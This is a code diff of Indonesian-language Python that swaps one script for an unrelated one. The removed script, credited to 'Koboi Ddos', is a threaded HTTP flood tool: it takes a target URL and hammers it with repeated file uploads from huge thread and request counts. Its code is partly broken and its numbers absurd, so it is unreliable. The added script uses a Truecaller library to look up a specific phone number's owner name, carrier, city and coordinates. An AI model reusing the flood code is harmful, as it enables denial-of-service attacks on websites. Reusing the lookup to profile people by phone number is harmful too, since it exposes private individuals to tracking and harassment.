@@ -1,87 +1,82 @@
-import requests
-import threading
-import time
-import socket
+import asyncio
+from truecallerpy import login, search_phonenumber
 
-# Informasi pengarang
-author = "Koboi Ddos"
+# Memperbaiki masalah import MutableSet
+from collections.abc import MutableSet
 
-# Fungsi untuk mendapatkan IP address
-def get_ip_address():
+async def main():
+    # Ganti dengan nomor telepon yang ingin Anda cari
+    nomor_telepon = "+6201326020530"
+
     try:
-        # Mendapatkan nama host
-        host_name = socket.gethostname()
-        # Mendapatkan alamat IP lokal
-        ip_address = socket.gethostbyname(host_name)
-        return ip_address
-    except socket.error as e:
-        print(f"Gagal mendapatkan alamat IP: {e}")
-        return None
+        # Lakukan login ke akun Truecaller (gunakan nomor telepon Anda)
+        login_response = await login("+1234567890")
+        print("Respons Login:", login_response)
 
-# Menampilkan informasi pengarang
-print(f"Script ini ditulis oleh: {author}")
+        # Cari nomor telepon
+        search_response = await search_phonenumber(nomor_telepon)
+        print("Respons Pencarian:", search_response)
 
-# Memasukkan URL yang diinginkan
-url = input("Masukkan URL target: ")
+        # Ekstrak informasi spesifik (misalnya nama pemilik nomor telepon)
+        nama_pemilik = search_response.get("name", "Tidak ditemukan")
+        print(f"Pemilik nomor {nomor_telepon}: {nama_pemilik}")
 
-# Menampilkan IP address sebelum menjalankan thread-thread
-ip_sebelum = get_ip_address()
-if ip_sebelum:
-    print(f"Alamat IP Anda sebelum menjalankan thread adalah: {ip_sebelum}")
-else:
-    print("Gagal mendapatkan alamat IP sebelum menjalankan thread.")
+        # Ekstrak informasi tambahan dari query
+        jenis_nomor = search_response.get("number_type", "Tidak ditemukan")
+        nomor_valid = search_response.get("valid_number", "Tidak ditemukan")
+        nomor_val_ldforregion = search_response.get("val_ldforregion", "Tidak ditemukan")
+        kode_negara = search_response.get("country_code", "Tidak ditemukan")
+        kode_area = search_response.get("area_code", "Tidak ditemukan")
+        ekstensi = search_response.get("ext", "Tidak ditemukan")
+        format_e164 = search_response.get("format_e164", "Tidak ditemukan")
+        format_nasional = search_response.get("format_national", "Tidak ditemukan")
+        format_internasional = search_response.get("format_international", "Tidak ditemukan")
+        kode_dial_dari_negara = search_response.get("dial_from_country_code", "Tidak ditemukan")
+        nomor_dial_dari_negara = search_response.get("dial_from_country_number", "Tidak ditemukan")
+        operator = search_response.get("carrier", "Tidak ditemukan")
+        benua = search_response.get("continent", "Tidak ditemukan")
+        kode_benua = search_response.get("continent_code", "Tidak ditemukan")
+        kode_negara_iso = search_response.get("country", "Tidak ditemukan")
+        nama_negara = search_response.get("country_name", "Tidak ditemukan")
+        region = search_response.get("region", "Tidak ditemukan")
+        nama_region = search_response.get("region_name", "Tidak ditemukan")
+        kota = search_response.get("city", "Tidak ditemukan")
+        kode_pos = search_response.get("zip", "Tidak ditemukan")
+        latitude = search_response.get("lat", "Tidak ditemukan")
+        longitude = search_response.get("lon", "Tidak ditemukan")
+        zona_waktu = search_response.get("timezone", "Tidak ditemukan")
+        offset = search_response.get("offset", "Tidak ditemukan")
+        mata_uang = search_response.get("currency", "Tidak ditemukan")
 
-# Mendefinisikan IP palsu
-fake_ip_address = "18.239.18.95"
+        # Tampilkan informasi tambahan
+        print(f"Jenis Nomor: {jenis_nomor}")
+        print(f"Valid: {nomor_valid}")
+        print(f"Val LdForRegion: {nomor_val_ldforregion}")
+        print(f"Kode Negara: {kode_negara}")
+        print(f"Kode Area: {kode_area}")
+        print(f"Ekstensi: {ekstensi}")
+        print(f"Format E164: {format_e164}")
+        print(f"Format Nasional: {format_nasional}")
+        print(f"Format Internasional: {format_internasional}")
+        print(f"Kode Dial Dari Negara: {kode_dial_dari_negara}")
+        print(f"Nomor Dial Dari Negara: {nomor_dial_dari_negara}")
+        print(f"Operator: {operator}")
+        print(f"Benua: {benua}")
+        print(f"Kode Benua: {kode_benua}")
+        print(f"Kode Negara ISO: {kode_negara_iso}")
+        print(f"Nama Negara: {nama_negara}")
+        print(f"Region: {region}")
+        print(f"Nama Region: {nama_region}")
+        print(f"Kota: {kota}")
+        print(f"Kode Pos: {kode_pos}")
+        print(f"Latitude: {latitude}")
+        print(f"Longitude: {longitude}")
+        print(f"Zona Waktu: {zona_waktu}")
+        print(f"Offset: {offset}")
+        print(f"Mata Uang: {mata_uang}")
 
-# Fungsi yang akan dijalankan oleh setiap thread
-def make_request(url, exit_event, thread_id, jumlah_permintaan):
-    try:
-        for i in range(jumlah_permintaan):
-            with open("https://kosred.com/a/iqdmbo.mp4", "rb") as file:  # Membuka file MP4 untuk dibaca dalam mode binary
-                files = {"file": file}  # Menyusun payload untuk dikirimkan bersama permintaan POST
-                response = requests.post(url, files=files)  # Mengirimkan file sebagai bagian dari permintaan POST
-            print(f"Thread-{thread_id}: Permintaan ke {url} berhasil! IP Address: {fake_ip_address}")
+    except Exception as e:
+        print(f"Terjadi kesalahan: {str(e)}")
 
-            if i == 0:
-                time.sleep(0.1)
-                jumlah_permintaan *= 151111999000000999999999999999999999999999999900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999909000000000000000090000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999900000000000000000000000000000000000000000000000000000000000000000000000000000009999999999999999999999999999999999999999999888888888888888888888888888888990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999999999999000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999998888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999090000000000000000900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000999999999999999999000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999999999999999999999999999999  # Menggandakan jumlah permintaan setelah 1 detik pertama
-            else:
-                time.sleep(0.1)  # Interval waktu 0.1 detik
-    except requests.exceptions.RequestException as e:
-        print(f"Thread-{thread_id}: Gagal melakukan permintaan ke {url}: {e}")
-        exit_event.set()
-    except KeyboardInterrupt:
-        print(f"Thread-{thread_id}: Ctrl+C ditekan. Menghentikan permintaan...")
-        exit_event.set()
-
-# Jumlah thread yang akan digunakan
-jumlah_thread = 199999999999999999999999999999999999999999999999999999999999
-# Jumlah permintaan yang ingin diulang
-jumlah_permintaan_threads = [1,]
-
-# Membuat dan menjalankan thread-thread
-exit_event = threading.Event()
-threads = []
-
-for i in range(jumlah_thread):
-    # Menggunakan nilai jumlah permintaan secara berulang
-    jumlah_permintaan = jumlah_permintaan_threads[i % len(jumlah_permintaan_threads)]
-
-    thread = threading.Thread(target=make_request, args=(url, exit_event, i + 1, jumlah_permintaan))
-    threads.append(thread)
-    thread.start()  
-
-try:
-    # Menunggu hingga semua thread selesai
-    for thread in threads:
-        thread.join()
-except KeyboardInterrupt:
-    print("Ctrl+C ditekan. Menghentikan semua thread...")
-
-# Menampilkan IP address setelah menjalankan thread-thread
-ip_sesudah = get_ip_address()
-if ip_sesudah:
-    print(f"Alamat IP Anda setelah menjalankan thread adalah: {ip_sesudah}")
-else:
-    print("Gagal mendapatkan alamat IP setelah menjalankan thread.")
+if __name__ == "__main__":
+    asyncio.run(main())
